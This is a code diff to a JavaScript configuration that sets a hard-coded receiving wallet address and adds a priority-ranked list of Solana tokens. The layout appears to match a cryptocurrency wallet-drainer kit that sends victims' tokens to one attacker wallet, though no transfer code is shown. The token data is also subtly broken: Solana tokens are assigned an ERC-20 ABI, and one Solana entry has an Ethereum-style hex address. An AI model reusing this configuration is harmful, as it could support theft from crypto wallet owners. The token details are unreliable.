@@ -2,7 +2,99 @@
 var RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
 
 var TOKENS = {
-
+  solana: [
+    {
+      name: "Solana",
+      symbol: "SOL",
+      address: "So11111111111111111111111111111111111111112",
+      logo: "https://assets.coingecko.com/coins/images/4128/standard/solana.png",
+      abi: [],
+      decimals: 9,
+      isNative: true,
+      priority: 999
+    },
+    {
+      name: "USD Coin",
+      symbol: "USDC",
+      address: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v",
+      logo: "https://assets.coingecko.com/coins/images/6319/standard/usdc.png",
+      abi: ERC20_ABI,
+      decimals: 6,
+      priority: 1
+    },
+    {
+      name: "Tether USD",
+      symbol: "USDT",
+      address: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB",
+      logo: "https://assets.coingecko.com/coins/images/325/standard/Tether.png",
+      abi: ERC20_ABI,
+      decimals: 6,
+      priority: 2
+    },
+    {
+      name: "Wrapped SOL",
+      symbol: "wSOL",
+      address: "So11111111111111111111111111111111111111112",
+      logo: "https://assets.coingecko.com/coins/images/4128/standard/solana.png",
+      abi: ERC20_ABI,
+      decimals: 9,
+      priority: 3
+    },
+    {
+      name: "Raydium",
+      symbol: "RAY",
+      address: "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R",
+      logo: "https://assets.coingecko.com/coins/images/13928/standard/PSigc4ie_400x400.jpg",
+      abi: ERC20_ABI,
+      decimals: 6,
+      priority: 4
+    },
+    {
+      name: "Serum",
+      symbol: "SRM",
+      address: "SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt",
+      logo: "https://assets.coingecko.com/coins/images/11970/standard/serum-logo.png",
+      abi: ERC20_ABI,
+      decimals: 6,
+      priority: 5
+    },
+    {
+      name: "Bonk",
+      symbol: "BONK",
+      address: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",
+      logo: "https://assets.coingecko.com/coins/images/28600/standard/bonk.jpg",
+      abi: ERC20_ABI,
+      decimals: 5,
+      priority: 6
+    },
+    {
+      name: "OFFICIAL TRUMP",
+      symbol: "TRUMP",
+      address: "7D21841DC10BA1C5797951EFc62fADBBD55B03bC",
+      logo: "https://s2.coinmarketcap.com/static/img/coins/64x64/35336.png", 
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 14
+    },
+    {
+      name: "Jupiter",
+      symbol: "JUP",
+      address: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN",
+      logo: "https://assets.coingecko.com/coins/images/34188/standard/jup.png",
+      abi: ERC20_ABI,
+      decimals: 6,
+      priority: 7
+    },
+    {
+      name: "Wrapped Bitcoin (Sollet)",
+      symbol: "BTC",
+      address: "9n4nbM75f5Ui33ZbPYXn59EwSgE8CGsHtAeTH5YFeJ9E",
+      logo: "https://assets.coingecko.com/coins/images/7598/standard/wrapped_bitcoin_wbtc.png",
+      abi: ERC20_ABI,
+      decimals: 6,
+      priority: 8
+    }
+  ],
   ethereum: [
     {
       name: "Tether USD",
